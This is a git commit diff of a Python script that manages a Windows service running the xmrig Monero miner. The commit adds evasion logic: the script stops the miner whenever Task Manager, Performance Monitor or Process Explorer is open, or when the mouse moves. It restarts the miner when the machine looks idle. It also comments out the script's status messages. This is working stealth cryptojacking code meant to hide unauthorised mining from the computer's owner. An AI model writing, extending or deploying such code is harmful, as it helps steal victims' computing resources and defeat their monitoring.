46f019d0812ce96a61edb14270443d4afb3404b6
kik.gater@gmail.com <PizdaNoga4>
2020-05-28 01:44:34 +0200

    1. add mouse control 2. add soft list 3. change service name

--- main.py
+++ main.py
@@ -1,38 +1,62 @@
 import psutil
 import time
 import subprocess
+from ctypes import windll, Structure, c_ulong, byref, c_ushort
 
-SOFT_NAME = 'Taskmgr.exe'
-SERVICE_NAME = 'moneroocean_miner'
-MINER_NAME = 'xmrig.exe'
+SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe']
+SERVICE_NAME = 'Moneroocean'
+MINER_NAME = ['xmrig.exe']
+
+
+class POINT(Structure):
+    _fields_ = [("x", c_ulong), ("y", c_ulong)]
+
+VK_LBUTTON = 0x01               # Left mouse button
+VK_RBUTTON = 0x02               # Right mouse button
+
+
+def queryMousePosition():
+    pt = POINT()
+    windll.user32.GetCursorPos(byref(pt))
+    return {"x": pt.x, "y": pt.y}
 
 
 def find_procs_by_name(name):
     "Return a list of processes matching 'name'."
     ls = []
     for p in psutil.process_iter(['name']):
-        if p.info['name'] == name:
-            ls.append(p)
+        for soft in name:
+            if p.info['name'] == soft:
+                ls.append(p)
     return ls
 
 
 while True:
+    mouse_position = queryMousePosition()
+    time.sleep(0.5)
+    current_mouse_position = queryMousePosition()
     s = psutil.win_service_get(SERVICE_NAME)
-    print(s.as_dict()['status'])
-    if find_procs_by_name(SOFT_NAME):
-        print('Запущен диспетчер задач')
+    # print(s.as_dict()['status'])
+    if find_procs_by_name(SOFTS_NAME) or current_mouse_position != mouse_position:
+        # print('Запущен диспетчер задач или шевелилась мышь')
         if s.as_dict()['status'] == 'running':
-            print('майнер запущен - останавливаю')
-            print('Служба {} запущена'.format(SERVICE_NAME))
+            # print('майнер запущен - останавливаю')
+            # print('Служба {} запущена'.format(SERVICE_NAME))
             subprocess.call(['sc', 'stop', SERVICE_NAME])
         else:
-            print('майнер не запущен - ничего не делаю')
+            # print('майнер не запущен - ничего не делаю')
+            pass
     else:
-        print('He 3апущен диспетчер задач')
+        # print('He 3апущен диспетчер задач')
         if not find_procs_by_name(MINER_NAME):
             print('майнер не запущен - запускаю')
+            print(not find_procs_by_name(MINER_NAME))
             subprocess.call(['sc', 'start', SERVICE_NAME])
         else:
-            print('майнер запущен - ничего не делаю')
-    time.sleep(1)
+            # print('майнер запущен - ничего не делаю')
+            pass
+
+
+
+
 
